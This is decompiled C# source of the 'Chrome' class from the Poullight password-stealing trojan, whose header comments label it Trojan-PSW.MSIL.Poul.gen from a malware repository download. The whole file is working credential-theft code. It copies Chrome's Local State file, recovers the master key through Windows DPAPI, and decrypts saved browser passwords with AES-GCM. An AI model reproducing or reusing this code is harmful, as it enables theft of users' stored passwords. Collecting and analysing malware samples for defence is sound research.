// Decompiled with JetBrains decompiler
// Type: Chrome
// Assembly: Poullight, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A9555FC6-4E86-4D22-9A29-AD3955B2BC52
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\Trojan-PSW.MSIL.Poul.gen-67cfa95ccaa06c437e04f38c3ef890986c1885c61636b84bf51d16b0d7bf957c.exe

using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System;
using System.Collections;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Web.Script.Serialization;

public class Chrome
{
  protected byte[] mkey;

  [DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
  protected static extern bool CryptUnprotectData(
    ref Chrome.DATA_BLOB pCipherText,
    ref string pszDescription,
    ref Chrome.DATA_BLOB pEntropy,
    IntPtr pReserved,
    ref Chrome.CRYPTPROTECT_PROMPTSTRUCT pPrompt,
    int dwFlags,
    ref Chrome.DATA_BLOB pPlainText);

  protected static void InitPrompt(ref Chrome.CRYPTPROTECT_PROMPTSTRUCT ps)
  {
    ps.cbSize = Marshal.SizeOf(typeof (Chrome.CRYPTPROTECT_PROMPTSTRUCT));
    ps.dwPromptFlags = 0;
    ps.hwndApp = (IntPtr) 0;
    ps.szPrompt = (string) null;
  }

  protected static void InitBLOB(byte[] data, ref Chrome.DATA_BLOB blob)
  {
    if (data == null)
      data = new byte[0];
    blob.pbData = Marshal.AllocHGlobal(data.Length);
    if (blob.pbData == IntPtr.Zero)
      return;
    blob.cbData = data.Length;
    Marshal.Copy(data, 0, blob.pbData, data.Length);
  }

  protected static byte[] cipher_decrypter(byte[] cipherTextBytes)
  {
    Chrome.DATA_BLOB pPlainText = new Chrome.DATA_BLOB();
    Chrome.DATA_BLOB dataBlob1 = new Chrome.DATA_BLOB();
    Chrome.DATA_BLOB dataBlob2 = new Chrome.DATA_BLOB();
    Chrome.CRYPTPROTECT_PROMPTSTRUCT cryptprotectPromptstruct = new Chrome.CRYPTPROTECT_PROMPTSTRUCT();
    Chrome.InitPrompt(ref cryptprotectPromptstruct);
    string empty = string.Empty;
    try
    {
      try
      {
        Chrome.InitBLOB(cipherTextBytes, ref dataBlob1);
      }
      catch
      {
      }
      try
      {
        Chrome.InitBLOB(Encoding.Default.GetBytes(string.Empty), ref dataBlob2);
      }
      catch
      {
      }
      if (!Chrome.CryptUnprotectData(ref dataBlob1, ref empty, ref dataBlob2, IntPtr.Zero, ref cryptprotectPromptstruct, 1, ref pPlainText))
        return (byte[]) null;
      byte[] destination = new byte[pPlainText.cbData];
      Marshal.Copy(pPlainText.pbData, destination, 0, pPlainText.cbData);
      return destination;
    }
    catch
    {
      return (byte[]) null;
    }
    finally
    {
      if (pPlainText.pbData != IntPtr.Zero)
        Marshal.FreeHGlobal(pPlainText.pbData);
      if (dataBlob1.pbData != IntPtr.Zero)
        Marshal.FreeHGlobal(dataBlob1.pbData);
      if (dataBlob2.pbData != IntPtr.Zero)
        Marshal.FreeHGlobal(dataBlob2.pbData);
    }
  }

  public void GETMasterKey(string path)
  {
    try
    {
      if (!File.Exists(path))
        return;
      string str = string.Format("{0}{1}", (object) Buffer.path_t, (object) GetRandom.String());
      try
      {
        if (File.Exists(str))
          File.Delete(str);
      }
      catch
      {
      }
      try
      {
        File.Copy(path, str, true);
      }
      catch
      {
      }
      byte[] sourceArray = Convert.FromBase64String((string) ((IDictionary) ((IDictionary) new JavaScriptSerializer().DeserializeObject(File.ReadAllText(str)))[(object) "os_crypt"])[(object) "encrypted_key"]);
      byte[] numArray = new byte[sourceArray.Length - 5];
      Array.Copy((Array) sourceArray, 5, (Array) numArray, 0, sourceArray.Length - 5);
      this.mkey = Chrome.cipher_decrypter(numArray);
    }
    catch
    {
    }
  }

  protected static string[] GET_IVPayLoad(string encrypted_password) => new string[2]
  {
    encrypted_password.Substring(3, 12),
    encrypted_password.Substring(15)
  };

  protected static string decrypt_data(byte[] EncryptedData, byte[] key, byte[] iv)
  {
    try
    {
      byte[] input = EncryptedData;
      GcmBlockCipher gcmBlockCipher = new GcmBlockCipher((IBlockCipher) new AesEngine());
      gcmBlockCipher.Init(false, (ICipherParameters) new AeadParameters(new KeyParameter(key), 128, iv, (byte[]) null));
      byte[] numArray = new byte[gcmBlockCipher.GetOutputSize(input.Length)];
      gcmBlockCipher.DoFinal(numArray, gcmBlockCipher.ProcessBytes(input, 0, input.Length, numArray, 0));
      return Encoding.Default.GetString(numArray);
    }
    catch
    {
      return (string) null;
    }
  }

  public string Decrypt(string encrypted_password, bool v80 = true)
  {
    try
    {
      if (!v80)
        return Encoding.Default.GetString(Chrome.cipher_decrypter(Encoding.Default.GetBytes(encrypted_password)));
      string[] ivPayLoad = Chrome.GET_IVPayLoad(encrypted_password);
      byte[] bytes = Encoding.Default.GetBytes(ivPayLoad[0]);
      string str = Chrome.decrypt_data(Encoding.Default.GetBytes(ivPayLoad[1]), this.mkey, bytes);
      return str.Length > 0 ? str : (string) null;
    }
    catch
    {
    }
    return (string) null;
  }

  [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
  protected internal struct DATA_BLOB
  {
    public int cbData;
    public IntPtr pbData;
  }

  [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
  protected internal struct CRYPTPROTECT_PROMPTSTRUCT
  {
    public int cbSize;
    public int dwPromptFlags;
    public IntPtr hwndApp;
    public string szPrompt;
  }
}
